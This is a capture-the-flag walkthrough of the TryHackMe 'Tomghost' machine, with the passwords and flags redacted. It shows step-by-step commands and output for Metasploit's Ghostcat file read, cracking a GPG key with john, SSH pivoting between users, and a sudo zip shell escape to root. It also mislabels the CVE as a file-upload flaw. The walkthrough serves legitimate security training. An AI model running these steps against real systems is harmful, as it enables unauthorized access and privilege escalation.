> [Tomghost](https://tryhackme.com/room/tomghost) is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I'll have to remove the flags and passwords...

## Network scanning
The machine IP address is `10.10.68.255` and we shall start by scanning it by using `nmap`.

Command: `nmap -sC -sV -oA initial 10.10.68.255`


```bash 
└─$ nmap -sC -sV -oA initial 10.10.68.255

## Enumeration

There is a website running on port 8080. We notice it is `Apache Tomcat` version `9.0.30`. If we google some of the vulnerabilities which affected that version we get `File upload vulnerability` [CVE-2020-1938](https://www.exploit-db.com/exploits/49039). Now lets launch `Metaslpoit` and search it.

```bash
msf6 > search CVE-2020-1938

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat
```

Use the exploit which we have found.

```bash
use auxiliary/admin/http/tomcat_ghostcat
```

Then set the RHOSTS to our machine's IP address.

```bash
msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts 10.10.68.255
rhosts => 10.10.68.255
```

Once you have set the `rhosts` you can now `exploit` the system by using `run` or `exploit`

```bash
msf6 auxiliary(admin/http/tomcat_ghostcat) > run

     Welcome to GhostCat
	skyfuck:I_HAVE_REMOVED_THE_PASSWORD
  </description>

</web-app>
msf6 auxiliary(admin/http/tomcat_ghostcat) >
```
You will find the username and the password on the `description tag`. 
You can also find this file here: `/home/{YOUR_USERNAME}/.msf4/loot/20230420121725_default_10.10.68.255_WEBINFweb.xml_167447.txt`

## Initial Foothold
Since we have the username and password we can `ssh` into the machine. 

```bash
└─$ ssh skyfuck@10.10.68.255
```

lets cat the user flag

```bash
skyfuck@ubuntu:~$ cat /home/merlin/user.txt 
THM{I_HAVE_REMOVED_THE_FLAG}
```

If we go to the `home` directory, we find two files:

```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
Lets copy the files to our machine so as we can crack the `credential.gpg`

```bash
└─$ scp skyfuck@10.10.68.255:/home/skyfuck/* .
skyfuck@10.10.68.255's password: 
credential.pgp                                    100%  394     0.9KB/s   00:00    
tryhackme.asc
```

We shall use `John` to crack the password meaning we have to use `gpg2john` so as we have it's hash to crack it.
```bash
└─$ gpg2john tryhackme.asc > hash
```

Now fire up john and let it do its thing.
```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])

```

Nice... We have the password of the `gpg` file so lets first import it.
```bash
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Once we have imported it we are going to decrypt the gpg.
```bash
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:I_HAVE_REMOVED_THE_PASSWORD
skyfuck@ubuntu:~$
```
Wooah... We have found another user and the password.

## Privilege Escalation

Lets login in his account and find our way to being the root.

```bash
└─$ ssh merlin@10.10.68.255
merlin@10.10.68.255's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
```

By running `sudo -l` we see that the `/usr/bin/zip` can be ran by this user with root privilege.
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
merlin@ubuntu:~$
```

So lets go to `gtfobins` and find our payload to use. [Link](https://gtfobins.github.io/gtfobins/zip/#sudo)

```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

We have root soo lets get our flag and get out of here.
```bash
# cat /root/root.txt
THM{I_HAVE_REMOVED_THE_FLAG}
#
```
